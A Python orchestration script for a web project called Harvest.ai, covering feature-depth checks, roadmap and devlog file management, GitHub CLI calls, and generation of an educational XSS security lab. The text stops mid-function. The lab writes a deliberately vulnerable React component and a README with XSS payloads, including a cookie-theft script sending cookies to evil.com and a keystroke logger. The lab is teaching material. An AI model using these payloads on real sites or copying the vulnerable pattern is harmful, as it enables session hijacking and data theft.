#!/usr/bin/env python3
"""
Harvest.ai Agent Boot System - Production-Grade Educational Simulator
======================================================================
This implements the AGENT_BOOT contract: production-ready patterns that teach by doing.

NOT DOCUMENTATION. THIS IS IMPLEMENTATION.

WHAT THIS DOES:
- Enforces production-grade depth in every feature
- Implements distributed systems patterns
- Creates explorable, breakable learning environments
- Tracks everything with forced documentation updates
"""

import asyncio
import json
import logging
import os
import subprocess
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum, auto
from pathlib import Path
from typing import Any, Dict, List, Optional, TypedDict
import hashlib
import shutil
import re
from collections import defaultdict

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('agent_boot_harvest.log', mode='a')
    ]
)
logger = logging.getLogger(__name__)

# ============================================================================
# HARVEST.AI SPECIFIC PATTERNS
# ============================================================================

class FeatureDepth(Enum):
    """
    Feature depth levels per AGENT_BOOT contract.
    Every feature MUST reach PRODUCTION level.
    """
    SHALLOW = "Just UI components"
    DOCUMENTED = "Has documentation but no implementation"
    MOCKED = "Has MSW mocks but no real logic"
    IMPLEMENTED = "Basic functionality works"
    PRODUCTION = "Industry patterns, error handling, performance optimized"

class HarvestFeature(Enum):
    """Core features that need production-grade depth"""
    CONTENT_GENERATOR = "Content generation with streaming, caching, circuit breakers"
    MSW_SIMULATOR = "Distributed systems simulation with chaos engineering"
    AUTH_SYSTEM = "OAuth state machines, JWT refresh, session management"
    TOUR_LAB = "Interactive learning lab with breakable components"
    SSE_STREAMING = "Server-sent events with backpressure and recovery"
    SECURITY_LAB = "Exploitable vulnerabilities (sandboxed) with defenses"

# ============================================================================
# TRACKING ENFORCER - PREVENTS CONTEXT LOSS
# ============================================================================

@dataclass
class TrackingEnforcer:
    """
    CRITICAL: Enforces documentation updates per AGENT_BOOT.
    Without this, context is lost between sessions.
    """
    last_update: float = field(default_factory=time.time)
    changes_since_update: int = 0
    pending_updates: List[Dict] = field(default_factory=list)
    update_threshold: int = 3  # Force update after 3 changes
    time_threshold: int = 300  # Force update after 5 minutes
    
    def must_update(self) -> bool:
        """Check if update is mandatory"""
        time_elapsed = time.time() - self.last_update > self.time_threshold
        changes_accumulated = self.changes_since_update >= self.update_threshold
        
        if time_elapsed:
            logger.warning("⏰ TRACKING ENFORCEMENT: 5 minutes elapsed - UPDATE REQUIRED")
            return True
        if changes_accumulated:
            logger.warning(f"📊 TRACKING ENFORCEMENT: {self.changes_since_update} changes - UPDATE REQUIRED")
            return True
        return False
    
    def track_change(self, change_type: str, description: str, **details):
        """Track any change that happens"""
        self.pending_updates.append({
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'type': change_type,
            'description': description,
            'details': details
        })
        self.changes_since_update += 1
        
        if self.must_update():
            return True
        return False
    
    def reset(self):
        """Reset after successful update"""
        self.last_update = time.time()
        self.changes_since_update = 0
        self.pending_updates = []

# ============================================================================
# PRODUCTION PATTERNS IMPLEMENTATION
# ============================================================================

class CircuitBreaker:
    """
    Circuit breaker pattern implementation.
    WHY: This is what AGENT_BOOT means by "production-grade".
    """
    def __init__(self, failure_threshold: int = 5, recovery_timeout: int = 60):
        self.failure_threshold = failure_threshold
        self.recovery_timeout = recovery_timeout
        self.failure_count = 0
        self.last_failure_time = None
        self.state = "CLOSED"  # CLOSED, OPEN, HALF_OPEN
    
    def call_succeeded(self):
        """Reset on success"""
        self.failure_count = 0
        self.state = "CLOSED"
    
    def call_failed(self):
        """Track failure and open circuit if threshold reached"""
        self.failure_count += 1
        self.last_failure_time = time.time()
        
        if self.failure_count >= self.failure_threshold:
            self.state = "OPEN"
            logger.error(f"🔌 Circuit breaker OPEN after {self.failure_count} failures")
            return True
        return False
    
    def should_attempt_reset(self) -> bool:
        """Check if we should try half-open state"""
        if self.state == "OPEN" and self.last_failure_time:
            if time.time() - self.last_failure_time > self.recovery_timeout:
                self.state = "HALF_OPEN"
                logger.info("🔌 Circuit breaker attempting reset (HALF_OPEN)")
                return True
        return self.state != "OPEN"

class ExponentialBackoff:
    """
    Exponential backoff for retry logic.
    WHY: Production systems need intelligent retry strategies.
    """
    def __init__(self, base_delay: float = 1.0, max_delay: float = 60.0, factor: float = 2.0):
        self.base_delay = base_delay
        self.max_delay = max_delay
        self.factor = factor
        self.attempt = 0
    
    def next_delay(self) -> float:
        """Calculate next delay with jitter"""
        delay = min(self.base_delay * (self.factor ** self.attempt), self.max_delay)
        # Add jitter to prevent thundering herd
        import random
        jitter = random.uniform(0, delay * 0.1)
        self.attempt += 1
        return delay + jitter
    
    def reset(self):
        """Reset for new sequence"""
        self.attempt = 0

# ============================================================================
# GITHUB INTEGRATION
# ============================================================================

class GitHubManager:
    """
    GitHub integration for issue and PR management.
    Implements actual GitHub API operations.
    """
    
    def __init__(self, project_root: Path):
        self.project_root = project_root
        self.gh_available = self._check_gh_cli()
        
    def _check_gh_cli(self) -> bool:
        """Check if GitHub CLI is available"""
        try:
            result = subprocess.run(
                ['gh', 'auth', 'status'],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.returncode == 0
        except:
            return False
    
    async def create_issue(self, title: str, body: str, labels: List[str] = None) -> Dict[str, Any]:
        """Create GitHub issue"""
        if not self.gh_available:
            return {'success': False, 'error': 'GitHub CLI not available'}
        
        try:
            cmd = ['gh', 'issue', 'create', '--title', title, '--body', body]
            
            if labels:
                for label in labels:
                    cmd.extend(['--label', label])
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                issue_url = result.stdout.strip()
                issue_number = issue_url.split('/')[-1] if issue_url else None
                
                return {
                    'success': True,
                    'issue_number': issue_number,
                    'url': issue_url
                }
            else:
                return {'success': False, 'error': result.stderr}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    async def list_issues(self, state: str = 'open') -> List[Dict]:
        """List GitHub issues"""
        if not self.gh_available:
            return []
        
        try:
            result = subprocess.run(
                ['gh', 'issue', 'list', '--state', state, '--json', 'number,title,state,labels'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0 and result.stdout:
                return json.loads(result.stdout)
            return []
            
        except:
            return []

# ============================================================================
# EPICS MANAGER - FULL CRUD WITH AUTO-UPDATE
# ============================================================================

class EpicsManager:
    """
    Manages EPICS.md with full CRUD operations and auto-updates.
    Actually updates the file, not just reads it.
    """
    
    def __init__(self, project_root: Path):
        self.project_root = project_root
        self.epics_path = project_root / "docs" / "roadmap" / "EPICS.md"
        self.epics_status_path = project_root / "docs" / "roadmap" / "EPICS_STATUS.md"
        self.epics = self._load_epics()
    
    def _load_epics(self) -> Dict[str, Dict]:
        """Load and parse EPICS.md"""
        epics = {}
        
        if not self.epics_path.exists():
            return epics
        
        try:
            content = self.epics_path.read_text()
            current_epic = None
            
            for line in content.split('\n'):
                # Parse epic headers
                if line.startswith('## Epic '):
                    match = re.match(r'## Epic ([A-Z]): (.+)', line)
                    if match:
                        epic_id = match.group(1)
                        title = match.group(2)
                        current_epic = {
                            'id': epic_id,
                            'title': title,
                            'status': 'TODO',
                            'progress': 0,
                            'tasks': []
                        }
                        epics[epic_id] = current_epic
                
                # Parse status
                elif current_epic and '**Status:**' in line:
                    status_match = re.search(r'\*\*Status:\*\* (.+)', line)
                    if status_match:
                        current_epic['status'] = status_match.group(1)
                
                # Parse progress
                elif current_epic and '**Progress:**' in line:
                    progress_match = re.search(r'\*\*Progress:\*\* (\d+)%', line)
                    if progress_match:
                        current_epic['progress'] = int(progress_match.group(1))
                
                # Parse tasks
                elif current_epic and line.strip().startswith('- ['):
                    completed = line.strip().startswith('- [x]')
                    task_text = line.strip()[6:]  # Remove checkbox
                    current_epic['tasks'].append({
                        'text': task_text,
                        'completed': completed
                    })
            
        except Exception as e:
            logger.error(f"Failed to load EPICS: {e}")
        
        return epics
    
    async def update_epic_progress(self, epic_id: str, tasks_completed: int = None) -> bool:
        """Update epic progress and save to file"""
        if epic_id not in self.epics:
            return False
        
        epic = self.epics[epic_id]
        
        # Calculate progress
        if tasks_completed is not None:
            total_tasks = len(epic['tasks'])
            if total_tasks > 0:
                epic['progress'] = int((tasks_completed / total_tasks) * 100)
        else:
            # Auto-calculate from completed tasks
            completed = sum(1 for task in epic['tasks'] if task['completed'])
            total = len(epic['tasks'])
            if total > 0:
                epic['progress'] = int((completed / total) * 100)
        
        # Update status based on progress
        if epic['progress'] == 0:
            epic['status'] = 'TODO'
        elif epic['progress'] == 100:
            epic['status'] = 'DONE'
        else:
            epic['status'] = 'IN_PROGRESS'
        
        # Save to file
        return await self._save_epics()
    
    async def _save_epics(self) -> bool:
        """Save epics back to EPICS.md"""
        try:
            content = f"# Epics\n\nLast Updated: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}\n\n"
            
            # Sort epics by ID
            for epic_id in sorted(self.epics.keys()):
                epic = self.epics[epic_id]
                content += f"## Epic {epic_id}: {epic['title']}\n\n"
                content += f"**Status:** {epic['status']}\n"
                content += f"**Progress:** {epic['progress']}%\n\n"
                
                if epic['tasks']:
                    content += "### Tasks:\n"
                    for task in epic['tasks']:
                        checkbox = "[x]" if task['completed'] else "[ ]"
                        content += f"- {checkbox} {task['text']}\n"
                
                content += "\n---\n\n"
            
            # Backup existing file
            if self.epics_path.exists():
                backup_path = self.epics_path.with_suffix('.md.bak')
                shutil.copy(self.epics_path, backup_path)
            
            # Write new content
            self.epics_path.write_text(content)
            logger.info(f"✅ Updated EPICS.md with {len(self.epics)} epics")
            return True
            
        except Exception as e:
            logger.error(f"Failed to save EPICS: {e}")
            return False
    
    async def create_epic(self, title: str, tasks: List[str]) -> str:
        """Create new epic and return its ID"""
        # Generate next epic ID
        existing_ids = list(self.epics.keys())
        if existing_ids:
            last_id = sorted(existing_ids)[-1]
            next_id = chr(ord(last_id) + 1)
        else:
            next_id = 'A'
        
        # Create epic
        self.epics[next_id] = {
            'id': next_id,
            'title': title,
            'status': 'TODO',
            'progress': 0,
            'tasks': [{'text': task, 'completed': False} for task in tasks]
        }
        
        await self._save_epics()
        return next_id

# ============================================================================
# DEVLOG MANAGER - AUTO-LOGGER WITH RICH FORMATTING
# ============================================================================

class DevlogManager:
    """
    Manages DEVLOG.md with automatic logging and rich formatting.
    Tracks all operations and progress.
    """
    
    def __init__(self, project_root: Path):
        self.project_root = project_root
        self.devlog_path = project_root / "docs" / "status" / "DEVLOG.md"
        self.session_start = datetime.now(timezone.utc)
        self.session_entries = []
    
    async def log_action(self, action: str, details: Dict[str, Any] = None, status: str = "SUCCESS") -> None:
        """Log an action to the session buffer"""
        entry = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'action': action,
            'status': status,
            'details': details or {}
        }
        self.session_entries.append(entry)
        
        # Log to console
        icon = "✅" if status == "SUCCESS" else "❌" if status == "FAILED" else "⚠️"
        logger.info(f"{icon} {action}")
    
    async def write_session_log(self, summary: str = None) -> bool:
        """Write session log to DEVLOG.md"""
        try:
            # Read existing content
            if self.devlog_path.exists():
                existing_content = self.devlog_path.read_text()
            else:
                existing_content = "# Development Log\n\n"
            
            # Build session entry
            session_time = datetime.now(timezone.utc)
            session_duration = (session_time - self.session_start).total_seconds() / 60
            
            entry = f"\n## {session_time.strftime('%Y-%m-%d %H:%M')} - Agent Boot Session\n\n"
            
            if summary:
                entry += f"**Summary:** {summary}\n\n"
            
            entry += f"**Duration:** {session_duration:.1f} minutes\n"
            entry += f"**Actions:** {len(self.session_entries)}\n\n"
            
            # Add actions
            if self.session_entries:
                entry += "### Actions Performed:\n\n"
                for action_entry in self.session_entries:
                    time_str = action_entry['timestamp'].split('T')[1].split('.')[0]
                    status_icon = "✅" if action_entry['status'] == "SUCCESS" else "❌"
                    entry += f"- **{time_str}** {status_icon} {action_entry['action']}\n"
                    
                    if action_entry['details']:
                        for key, value in action_entry['details'].items():
                            entry += f"  - {key}: {value}\n"
            
            entry += "\n---\n"
            
            # Insert after the header
            lines = existing_content.split('\n')
            insert_pos = 2  # After title and empty line
            
            # Find first session entry position
            for i, line in enumerate(lines):
                if line.startswith('## 20'):
                    insert_pos = i
                    break
            
            # Insert new entry
            lines.insert(insert_pos, entry)
            
            # Write back
            self.devlog_path.parent.mkdir(parents=True, exist_ok=True)
            self.devlog_path.write_text('\n'.join(lines))
            
            logger.info(f"✅ Updated DEVLOG.md with {len(self.session_entries)} entries")
            return True
            
        except Exception as e:
            logger.error(f"Failed to write DEVLOG: {e}")
            return False

# ============================================================================
# PROGRESS TRACKER - VISUAL PROGRESS AND METRICS
# ============================================================================

class ProgressTracker:
    """
    Tracks and visualizes progress with charts and metrics.
    Provides rich progress reporting.
    """
    
    def __init__(self, project_root: Path):
        self.project_root = project_root
        self.metrics = defaultdict(float)
        self.history = []
    
    def create_progress_bar(self, value: float, max_value: float = 100, width: int = 40) -> str:
        """Create ASCII progress bar"""
        percentage = min(100, (value / max_value) * 100)
        filled = int((percentage / 100) * width)
        bar = '█' * filled + '░' * (width - filled)
        return f"[{bar}] {percentage:.1f}%"
    
    def generate_progress_report(self, features: Dict[str, Dict]) -> str:
        """Generate comprehensive progress report"""
        report = "\n" + "="*60 + "\n"
        report += "📊 PROGRESS REPORT\n"
        report += "="*60 + "\n\n"
        
        # Overall progress
        total_features = len(features)
        production_ready = sum(1 for f in features.values() 
                              if f.get('depth') == 'PRODUCTION')
        overall_progress = (production_ready / total_features * 100) if total_features > 0 else 0
        
        report += "🎯 Overall Progress:\n"
        report += f"   {self.create_progress_bar(overall_progress)}\n"
        report += f"   {production_ready}/{total_features} features production-ready\n\n"
        
        # Feature breakdown
        report += "📦 Feature Status:\n\n"
        
        depth_levels = {
            'PRODUCTION': '✅',
            'IMPLEMENTED': '🟡',
            'MOCKED': '🟠',
            'DOCUMENTED': '📝',
            'SHALLOW': '❌'
        }
        
        for name, feature in features.items():
            depth = feature.get('depth', 'SHALLOW')
            icon = depth_levels.get(depth, '❓')
            progress = feature.get('progress', 0)
            
            report += f"{icon} {name}:\n"
            report += f"   {self.create_progress_bar(progress)}\n"
            report += f"   Depth: {depth}\n"
            
            if feature.get('next_step'):
                report += f"   Next: {feature['next_step']}\n"
            report += "\n"
        
        # Velocity metrics
        if self.history:
            report += "📈 Velocity Metrics:\n"
            recent = self.history[-7:]  # Last 7 entries
            avg_progress = sum(h['progress'] for h in recent) / len(recent)
            report += f"   7-day average: {avg_progress:.1f}% per session\n"
            report += f"   Sessions tracked: {len(self.history)}\n"
        
        report += "="*60 + "\n"
        return report
    
    def save_metrics(self) -> None:
        """Save metrics to file for tracking"""
        metrics_path = self.project_root / "metrics" / "progress.json"
        metrics_path.parent.mkdir(parents=True, exist_ok=True)
        
        data = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'metrics': dict(self.metrics),
            'history': self.history
        }
        
        metrics_path.write_text(json.dumps(data, indent=2))

# ============================================================================
# HARVEST.AI PROJECT MANAGER
# ============================================================================

class HarvestProjectManager:
    """
    Manages Harvest.ai specific project state and operations.
    Integrates with Next.js, TypeScript, Storybook ecosystem.
    """
    
    def __init__(self, project_root: Path):
        self.project_root = project_root
        self.docs_path = project_root / "docs"
        self.src_path = project_root / "src"
        self.tracking = TrackingEnforcer()
        self.circuit_breakers = {}
        
        # Verify project structure
        if not (project_root / "package.json").exists():
            raise FileNotFoundError(f"Not a valid Harvest.ai project: {project_root}")
    
    async def check_feature_depth(self, feature: HarvestFeature) -> Dict[str, Any]:
        """
        Analyze how deep a feature implementation is.
        This is the core of AGENT_BOOT - ensuring production depth.
        """
        results = {
            'feature': feature.name,
            'current_depth': FeatureDepth.SHALLOW.value,
            'gaps': [],
            'next_steps': []
        }
        
        if feature == HarvestFeature.CONTENT_GENERATOR:
            # Check for production patterns
            checks = {
                'streaming': await self._check_streaming_implementation(),
                'circuit_breaker': await self._check_circuit_breaker(),
                'caching': await self._check_caching_layer(),
                'error_handling': await self._check_error_boundaries(),
                'tests': await self._check_test_coverage('ContentGenerator')
            }
            
            # Determine depth
            if all(checks.values()):
                results['current_depth'] = FeatureDepth.PRODUCTION.value
            elif checks['tests'] and any([checks['streaming'], checks['caching']]):
                results['current_depth'] = FeatureDepth.IMPLEMENTED.value
            elif await self._check_msw_mocks('generate'):
                results['current_depth'] = FeatureDepth.MOCKED.value
            
            # Identify gaps
            if not checks['streaming']:
                results['gaps'].append("Missing SSE/WebSocket streaming implementation")
                results['next_steps'].append("Implement streaming with backpressure handling")
            
            if not checks['circuit_breaker']:
                results['gaps'].append("No circuit breaker pattern")
                results['next_steps'].append("Add circuit breaker with exponential backoff")
            
            if not checks['caching']:
                results['gaps'].append("No request deduplication or caching")
                results['next_steps'].append("Implement cache with TTL and warming")
        
        return results
    
    async def _check_streaming_implementation(self) -> bool:
        """Check if streaming is properly implemented"""
        try:
            # Check for SSE endpoint
            sse_route = self.src_path / "app" / "api" / "generate" / "route.ts"
            if sse_route.exists():
                content = sse_route.read_text()
                return "EventSource" in content or "ServerSentEvents" in content
            return False
        except:
            return False
    
    async def _check_circuit_breaker(self) -> bool:
        """Check for circuit breaker implementation"""
        try:
            result = subprocess.run(
                ["grep", "-r", "CircuitBreaker", str(self.src_path)],
                capture_output=True,
                text=True
            )
            return result.returncode == 0 and len(result.stdout) > 0
        except:
            return False
    
    async def _check_caching_layer(self) -> bool:
        """Check for caching implementation"""
        try:
            result = subprocess.run(
                ["grep", "-r", "cache", str(self.src_path), "--include=*.ts", "--include=*.tsx"],
                capture_output=True,
                text=True
            )
            return "RequestCache" in result.stdout or "deduplication" in result.stdout
        except:
            return False
    
    async def _check_error_boundaries(self) -> bool:
        """Check for proper error handling"""
        try:
            result = subprocess.run(
                ["grep", "-r", "ErrorBoundary", str(self.src_path)],
                capture_output=True,
                text=True
            )
            return result.returncode == 0
        except:
            return False
    
    async def _check_test_coverage(self, component: str) -> bool:
        """Check if component has tests"""
        try:
            result = subprocess.run(
                ["find", str(self.src_path), "-name", f"*{component}*.test.*"],
                capture_output=True,
                text=True
            )
            return len(result.stdout.strip()) > 0
        except:
            return False
    
    async def _check_msw_mocks(self, handler: str) -> bool:
        """Check if MSW mocks exist for handler"""
        try:
            mocks_dir = self.src_path / "mocks" / "handlers"
            if mocks_dir.exists():
                for file in mocks_dir.glob("*.ts"):
                    content = file.read_text()
                    if handler in content:
                        return True
            return False
        except:
            return False
    
    async def implement_production_pattern(self, pattern: str) -> Dict[str, Any]:
        """
        Actually implement a production pattern.
        This is where AGENT_BOOT philosophy comes to life.
        """
        results = {
            'pattern': pattern,
            'implemented': False,
            'files_created': [],
            'files_modified': []
        }
        
        if pattern == "circuit_breaker":
            # Create actual circuit breaker implementation
            cb_path = self.src_path / "lib" / "patterns" / "circuit-breaker.ts"
            cb_path.parent.mkdir(parents=True, exist_ok=True)
            
            cb_content = '''/**
 * Circuit Breaker Pattern - Production Implementation
 * Per AGENT_BOOT: This is not documentation, this is implementation.
 */

export interface CircuitBreakerConfig {
  failureThreshold: number;
  recoveryTimeout: number;
  monitoringPeriod: number;
}

export class CircuitBreaker<T> {
  private failures = 0;
  private lastFailureTime: number | null = null;
  private state: 'CLOSED' | 'OPEN' | 'HALF_OPEN' = 'CLOSED';
  
  constructor(private config: CircuitBreakerConfig) {}
  
  async execute<R>(
    operation: () => Promise<R>,
    fallback?: () => R
  ): Promise<R> {
    if (this.state === 'OPEN') {
      if (this.shouldAttemptReset()) {
        this.state = 'HALF_OPEN';
      } else if (fallback) {
        return fallback();
      } else {
        throw new Error('Circuit breaker is OPEN');
      }
    }
    
    try {
      const result = await operation();
      this.onSuccess();
      return result;
    } catch (error) {
      this.onFailure();
      if (fallback) {
        return fallback();
      }
      throw error;
    }
  }
  
  private onSuccess(): void {
    this.failures = 0;
    this.state = 'CLOSED';
  }
  
  private onFailure(): void {
    this.failures++;
    this.lastFailureTime = Date.now();
    
    if (this.failures >= this.config.failureThreshold) {
      this.state = 'OPEN';
      console.error(`Circuit breaker opened after ${this.failures} failures`);
    }
  }
  
  private shouldAttemptReset(): boolean {
    return (
      this.lastFailureTime !== null &&
      Date.now() - this.lastFailureTime >= this.config.recoveryTimeout
    );
  }
}

// Export factory function for easy use
export function createCircuitBreaker<T>(
  config: Partial<CircuitBreakerConfig> = {}
): CircuitBreaker<T> {
  return new CircuitBreaker<T>({
    failureThreshold: config.failureThreshold || 5,
    recoveryTimeout: config.recoveryTimeout || 60000,
    monitoringPeriod: config.monitoringPeriod || 10000,
  });
}
'''
            
            cb_path.write_text(cb_content)
            results['files_created'].append(str(cb_path))
            results['implemented'] = True
            
            # Track this change
            self.tracking.track_change(
                'pattern_implementation',
                f'Implemented circuit breaker pattern',
                pattern='circuit_breaker',
                path=str(cb_path)
            )
        
        return results
    
    async def run_tests(self) -> Dict[str, Any]:
        """Run test suite and analyze results"""
        try:
            result = subprocess.run(
                ["npm", "test", "--", "--coverage", "--json"],
                cwd=self.project_root,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            # Parse test results
            test_data = {
                'passed': False,
                'coverage': {},
                'failures': []
            }
            
            if result.returncode == 0:
                test_data['passed'] = True
                
            # Try to parse coverage
            coverage_file = self.project_root / "coverage" / "coverage-summary.json"
            if coverage_file.exists():
                coverage = json.loads(coverage_file.read_text())
                test_data['coverage'] = {
                    'lines': coverage.get('total', {}).get('lines', {}).get('pct', 0),
                    'branches': coverage.get('total', {}).get('branches', {}).get('pct', 0),
                    'functions': coverage.get('total', {}).get('functions', {}).get('pct', 0),
                    'statements': coverage.get('total', {}).get('statements', {}).get('pct', 0)
                }
            
            return test_data
            
        except Exception as e:
            logger.error(f"Test execution failed: {e}")
            return {'passed': False, 'error': str(e)}
    
    async def update_documentation(self) -> bool:
        """
        Force documentation update per AGENT_BOOT requirements.
        This MUST happen regularly or context is lost.
        """
        try:
            # Update DEVLOG
            devlog_path = self.docs_path / "status" / "DEVLOG.md"
            timestamp = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
            
            # Build update entry
            entry = f"\n\n## {timestamp} - Agent Boot Session\n\n"
            
            if self.tracking.pending_updates:
                entry += "### Changes Made:\n"
                for update in self.tracking.pending_updates:
                    entry += f"- **{update['type']}**: {update['description']}\n"
                    if update.get('details'):
                        for key, value in update['details'].items():
                            entry += f"  - {key}: {value}\n"
            
            # Append to DEVLOG
            with open(devlog_path, 'a') as f:
                f.write(entry)
            
            # Update SYSTEM_STATUS
            status_path = self.docs_path / "SYSTEM_STATUS.md"
            status_content = f"""# System Status

Last Updated: {timestamp}
Updated By: Agent Boot

## Build Status
- Build: {'✅ PASSING' if await self._check_build() else '❌ FAILING'}
- Tests: {await self._get_test_status()}
- TypeScript: {'✅ NO ERRORS' if await self._check_typescript() else '❌ ERRORS'}

## Feature Depth Analysis

"""
            
            # Add feature depth for each core feature
            for feature in HarvestFeature:
                depth = await self.check_feature_depth(feature)
                status_content += f"### {feature.value}\n"
                status_content += f"- **Current Depth**: {depth['current_depth']}\n"
                if depth['gaps']:
                    status_content += f"- **Gaps**: {', '.join(depth['gaps'])}\n"
                if depth['next_steps']:
                    status_content += f"- **Next Steps**: {depth['next_steps'][0]}\n"
                status_content += "\n"
            
            status_path.write_text(status_content)
            
            # Reset tracking
            self.tracking.reset()
            
            logger.info("✅ Documentation updated successfully")
            return True
            
        except Exception as e:
            logger.error(f"Documentation update failed: {e}")
            return False
    
    async def _check_build(self) -> bool:
        """Check if project builds"""
        try:
            result = subprocess.run(
                ["npm", "run", "build"],
                cwd=self.project_root,
                capture_output=True,
                timeout=120
            )
            return result.returncode == 0
        except:
            return False
    
    async def _get_test_status(self) -> str:
        """Get test status summary"""
        try:
            test_results = await self.run_tests()
            if test_results['passed']:
                coverage = test_results.get('coverage', {})
                return f"✅ PASSING (Coverage: {coverage.get('lines', 0)}%)"
            return "❌ FAILING"
        except:
            return "⚠️ UNKNOWN"
    
    async def _check_typescript(self) -> bool:
        """Check TypeScript compilation"""
        try:
            result = subprocess.run(
                ["npx", "tsc", "--noEmit"],
                cwd=self.project_root,
                capture_output=True
            )
            return result.returncode == 0
        except:
            return False

# ============================================================================
# LEARNING LAB CREATOR
# ============================================================================

class LearningLabCreator:
    """
    Creates interactive learning labs per AGENT_BOOT philosophy.
    These are explorable, breakable, fixable systems.
    """
    
    def __init__(self, project_root: Path):
        self.project_root = project_root
        self.labs_path = project_root / "src" / "labs"
    
    async def create_security_lab(self) -> Dict[str, Any]:
        """
        Create an actually exploitable (but sandboxed) security lab.
        This is what AGENT_BOOT means by "learn by breaking".
        """
        lab_path = self.labs_path / "security"
        lab_path.mkdir(parents=True, exist_ok=True)
        
        # Create vulnerable component (sandboxed)
        vulnerable_component = '''import React, { useState } from 'react';

/**
 * SECURITY LAB: XSS Vulnerability Demo
 * This component is INTENTIONALLY vulnerable for educational purposes.
 * It's sandboxed and should never be used in production.
 */
export const XSSVulnerableComponent: React.FC = () => {
  const [userInput, setUserInput] = useState('');
  const [messages, setMessages] = useState<string[]>([]);
  
  const handleSubmit = () => {
    // VULNERABILITY: Direct HTML injection without sanitization
    // This is how XSS attacks work in real applications
    setMessages([...messages, userInput]);
  };
  
  return (
    <div className="p-4 border-2 border-red-500 rounded">
      <div className="bg-red-100 p-2 mb-4 rounded">
        ⚠️ SECURITY LAB - This component is intentionally vulnerable
      </div>
      
      <input
        type="text"
        value={userInput}
        onChange={(e) => setUserInput(e.target.value)}
        placeholder="Try injecting: <img src=x onerror=alert('XSS')>"
        className="w-full p-2 border rounded"
      />
      
      <button onClick={handleSubmit} className="mt-2 p-2 bg-blue-500 text-white rounded">
        Submit (Vulnerable)
      </button>
      
      <div className="mt-4">
        {messages.map((msg, i) => (
          // VULNERABILITY: dangerouslySetInnerHTML without sanitization
          <div key={i} dangerouslySetInnerHTML={{ __html: msg }} />
        ))}
      </div>
    </div>
  );
};

/**
 * SECURITY LAB: Fixed Version
 * This demonstrates proper input sanitization
 */
export const XSSSecureComponent: React.FC = () => {
  const [userInput, setUserInput] = useState('');
  const [messages, setMessages] = useState<string[]>([]);
  
  const sanitizeInput = (input: string): string => {
    // Basic HTML entity encoding
    return input
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/\\//g, '&#x2F;');
  };
  
  const handleSubmit = () => {
    // SECURE: Input is sanitized before storage/display
    setMessages([...messages, sanitizeInput(userInput)]);
  };
  
  return (
    <div className="p-4 border-2 border-green-500 rounded">
      <div className="bg-green-100 p-2 mb-4 rounded">
        ✅ SECURE VERSION - Input is properly sanitized
      </div>
      
      <input
        type="text"
        value={userInput}
        onChange={(e) => setUserInput(e.target.value)}
        placeholder="Try injecting: <img src=x onerror=alert('XSS')>"
        className="w-full p-2 border rounded"
      />
      
      <button onClick={handleSubmit} className="mt-2 p-2 bg-green-500 text-white rounded">
        Submit (Secure)
      </button>
      
      <div className="mt-4">
        {messages.map((msg, i) => (
          // SECURE: Text content is safely rendered
          <div key={i}>{msg}</div>
        ))}
      </div>
    </div>
  );
};
'''
        
        (lab_path / "xss-lab.tsx").write_text(vulnerable_component)
        
        # Create lab documentation
        lab_docs = '''# Security Lab: XSS Vulnerability

## Learning Objectives
1. Understand how XSS vulnerabilities work
2. Learn to identify vulnerable code patterns
3. Practice implementing secure alternatives
4. Test security measures

## The Vulnerability
The vulnerable component uses `dangerouslySetInnerHTML` without sanitization.
This allows attackers to inject malicious scripts.

## Try These Attacks
1. Basic alert: `<img src=x onerror=alert('XSS')>`
2. Cookie theft: `<script>document.location='http://evil.com?c='+document.cookie</script>`
3. Keylogger: `<script>document.onkeypress=function(e){fetch('/log?key='+e.key)}</script>`

## The Fix
The secure version sanitizes input by encoding HTML entities.
This prevents the browser from interpreting user input as HTML/JavaScript.

## Real-World Impact
- GitHub had an XSS vulnerability in 2020 via issue titles
- PayPal had XSS in their checkout flow in 2019
- These vulnerabilities can lead to account takeover, data theft, and more

## Prevention Checklist
- [ ] Never use dangerouslySetInnerHTML with user input
- [ ] Always sanitize/encode user input
- [ ] Use Content Security Policy headers
- [ ] Implement proper input validation
- [ ] Regular security audits
'''
        
        (lab_path / "README.md").write_text(lab_docs)
        
        return {
            'created': True,
            'path': str(lab_path),
            'components': ['XSSVulnerableComponent', 'XSSSecureComponent']
        }

# ============================================================================
# MAIN AGENT ORCHESTRATOR
# ============================================================================

class HarvestAgentBoot:
    """
    Main orchestrator for Harvest.ai Agent Boot.
    Enforces AGENT_BOOT contract: production-grade educational simulators.
    Now with FULL GitHub integration, EPICS management, and auto-logging.
    """
    
    def __init__(self):
        self.project_root = Path.cwd()
        self.manager = HarvestProjectManager(self.project_root)
        self.lab_creator = LearningLabCreator(self.project_root)
        self.github = GitHubManager(self.project_root)
        self.epics = EpicsManager(self.project_root)
        self.devlog = DevlogManager(self.project_root)
        self.progress = ProgressTracker(self.project_root)
        self.session_id = hashlib.sha256(
            datetime.now(timezone.utc).isoformat().encode()
        ).hexdigest()[:8]
        
        logger.info(f"🚀 Harvest Agent Boot initialized - Session: {self.session_id}")
        logger.info(f"   GitHub: {'✅ Connected' if self.github.gh_available else '❌ Not available'}")
    
    async def analyze_project_depth(self):
        """
        Analyze how deep the current implementation is.
        This is the core metric of AGENT_BOOT success.
        """
        print("\n" + "="*60)
        print("🔍 HARVEST.AI DEPTH ANALYSIS")
        print("="*60)
        
        total_features = len(HarvestFeature)
        production_ready = 0
        
        for feature in HarvestFeature:
            print(f"\n📦 {feature.name}")
            depth = await self.manager.check_feature_depth(feature)
            
            print(f"  Current Depth: {depth['current_depth']}")
            
            if depth['current_depth'] == FeatureDepth.PRODUCTION.value:
